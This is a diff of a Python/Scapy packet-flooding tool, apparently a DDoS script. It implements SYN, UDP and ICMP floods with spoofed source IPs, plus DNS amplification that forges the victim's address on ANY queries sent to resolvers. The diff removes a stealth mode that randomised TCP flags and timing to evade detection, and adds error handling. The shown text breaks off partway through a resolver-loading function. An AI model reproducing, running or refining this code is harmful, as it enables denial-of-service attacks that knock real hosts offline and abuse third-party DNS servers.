@@ -3,15 +3,8 @@ import time
 import random
 import sys
 from threading import Thread, Lock
-try:
-    from scapy.all import IP, TCP, UDP, ICMP, RandShort, DNS, DNSQR, send, conf
-    conf.L3socket = conf.L3socket or conf.L3socket6
-    conf.verb = 0  # Suppress Scapy output
-except ImportError:
-    print("Scapy is not installed. Please install it using: pip install scapy")
-    sys.exit(1)
 
-# Color constants
+# Constants for colors (unchanged)
 WHITE = "\033[7m"
 BRIGHT_WHITE = "\033[97m"
 BOLD_WHITE = "\033[1;97m"
@@ -20,7 +13,7 @@ GREEN = "\033[32m"
 YELLOW = "\033[33m"
 RESET = "\033[0m"
 
-# Logo
+# Logo (unchanged)
 logo = """
 \033[0;35m ███▄    █ ▓█████▄▄▄█████▓      ██▓███ ▓██    ██▓
 \033[0;35m ██ ▀█    █ ▓█    ▀▓  ██▒ ▓▒      ▓██░  ██▒▒██  ██▒
@@ -29,22 +22,33 @@ logo = """
 \033[0;35m▒██░   ▓██░░▒████▒ ▒██▒ ░  ██▓ ▒██▒ ░  ░ ░ ██▒▓░
 \033[0;35m░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒
 \033[0;35m░ ░░   ░ ▒░ ░ ░  ░    ░   ░▒  ░▒ ░      ▓██ ░▒░
-    ░    ░ ░    ░          ░  ░░        ▒ ▒ ░░
+    ░    ░ ░    ░          ░  ░░       ▒ ▒ ░░
           ░    ░ ░                  ░ ░
                                 ░   ░ ░
 """
 
-# Globals for thread-safe stats
+try:
+    from scapy.all import IP, TCP, UDP, ICMP, RandShort, DNS, DNSQR, send, conf
+    conf.L3socket = conf.L3socket or conf.L3socket6
+    conf.verb = 0  # Suppress Scapy output
+except ImportError:
+    print("Scapy is not installed. Please install it using: pip install scapy")
+    sys.exit(1)
+
+# Global stats and lock for thread-safe updates
 global_packet_count = 0
 global_total_bytes_sent = 0
 stats_lock = Lock()
 stop_attack = False
 
+
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
+
 def generate_random_ip():
-    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
 
 def update_stats(packet_size):
     global global_packet_count, global_total_bytes_sent
@@ -52,12 +56,11 @@ def update_stats(packet_size):
         global_packet_count += 1
         global_total_bytes_sent += packet_size
 
+
 def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_size,
-                         spoofed_ips, attack_type, dns_resolvers=None,
-                         stealth_mode=False, stealth_delay_range=(0, 0.01),
-                         stealth_random_flags=False):
+                         spoofed_ips, attack_type, dns_resolvers=None):
     global stop_attack
-    BATCH_SIZE = 200  # Lower batch size for stealthier bursts
+    BATCH_SIZE = 500  # Packets per batch
     packets_to_send = []
 
     while not stop_attack:
@@ -68,14 +71,8 @@ def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_siz
         packet = None
         ip_layer = IP(src=src_ip, dst=target_ip)
 
-        # Randomize TCP flags in stealth mode to avoid signature
-        tcp_flags = "S"
-        if stealth_mode and stealth_random_flags:
-            possible_flags = ['S', 'A', 'F', 'R', 'P', 'SA', 'FA', 'PA']
-            tcp_flags = random.choice(possible_flags)
-
         if attack_type == 'SYN':
-            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags=tcp_flags, seq=random.randint(1000, 99999))
+            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S", seq=random.randint(1000, 99999))
             packet = ip_layer / tcp_layer / payload_data
         elif attack_type == 'UDP':
             udp_layer = UDP(sport=RandShort(), dport=target_port)
@@ -90,7 +87,7 @@ def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_siz
                 break
             dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
             resolver_ip = random.choice(dns_resolvers)
-            ip_layer_amp = IP(src=target_ip, dst=resolver_ip)
+            ip_layer_amp = IP(src=target_ip, dst=resolver_ip)  # Victim is source, Resolver is dest
             udp_layer_amp = UDP(sport=RandShort(), dport=53)
             packet = ip_layer_amp / udp_layer_amp / dns_query
 
@@ -103,14 +100,11 @@ def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_siz
                     for p in packets_to_send:
                         update_stats(len(p))
                 except Exception:
+                    # Ignore errors during send to maintain attack flow
                     pass
                 packets_to_send = []
 
-            # Stealth mode: add small random delay between batches
-            if stealth_mode:
-                time.sleep(random.uniform(*stealth_delay_range))
-
-    # Send remaining packets
+    # Send any remaining packets before thread exits
     if packets_to_send:
         try:
             send(packets_to_send, verbose=0)
@@ -119,10 +113,8 @@ def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_siz
         except Exception:
             pass
 
-def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
-                spoof_ip_choice, attack_type, num_threads, dns_resolvers=None,
-                stealth_mode=False, stealth_delay_min=0.001, stealth_delay_max=0.01,
-                stealth_random_flags=False):
+
+def start_flood(target_ip, target_port, min_packet_size, max_packet_size, spoof_ip_choice, attack_type, num_threads, dns_resolvers=None):
     global global_packet_count, global_total_bytes_sent, stop_attack
     global_packet_count = 0
     global_total_bytes_sent = 0
@@ -141,13 +133,7 @@ def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
             print(f"Payload Size Range: {min_packet_size} - {max_packet_size} bytes")
         print(f"Spoofing Source IP: {GREEN}ENABLED{RESET}" if spoof_ip_choice.lower() == 'y' else f"Spoofing Source IP: {YELLOW}DISABLED (Using Real IP){RESET}")
         print(f"Number of Threads:  {num_threads}")
-        if stealth_mode:
-            print(f"{YELLOW}Stealth Mode: ENABLED{RESET}")
-            print(f"Stealth Delay Range: {stealth_delay_min:.4f}s to {stealth_delay_max:.4f}s")
-            print(f"Random TCP Flags: {'Yes' if stealth_random_flags else 'No'}")
-        else:
-            print(f"Stealth Mode: DISABLED")
-        print("\nThis will send packets as fast as possible (unless stealth mode is enabled).")
+        print("\nThis will send packets as fast as possible.")
         print("====================================")
         print("Live Stats")
 
@@ -160,11 +146,8 @@ def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
 
         threads = []
         for _ in range(num_threads):
-            thread = Thread(target=packet_sender_thread, args=(
-                target_ip, target_port, min_packet_size, max_packet_size,
-                spoofed_ips, attack_type, dns_resolvers,
-                stealth_mode, (stealth_delay_min, stealth_delay_max), stealth_random_flags
-            ))
+            thread = Thread(target=packet_sender_thread, args=(target_ip, target_port, min_packet_size, max_packet_size,
+                                                              spoofed_ips, attack_type, dns_resolvers))
             threads.append(thread)
             thread.daemon = True
             thread.start()
@@ -201,4 +184,22 @@ def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
     except KeyboardInterrupt:
         print("\n\n[!] Test stopped by user.")
     except Exception as e:
-        print(f"\n
+        print(f"\n[!] An error occurred: {e}")
+        print(f"{RED}Ensure Npcap/WinPcap is installed and you are running as Administrator.{RESET}")
+        print(f"{RED}Also, check if your firewall/antivirus is blocking raw packet sending.{RESET}")
+    finally:
+        stop_attack = True
+        for thread in threads:
+            thread.join(timeout=2)
+        print("\n[*] Flood stopped. Press Enter to return to the menu.")
+        input()
+
+
+def load_dns_resolvers(filename="dns_resolvers.txt"):
+    resolvers = []
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                ip = line.strip()
+                if ip:
+                   
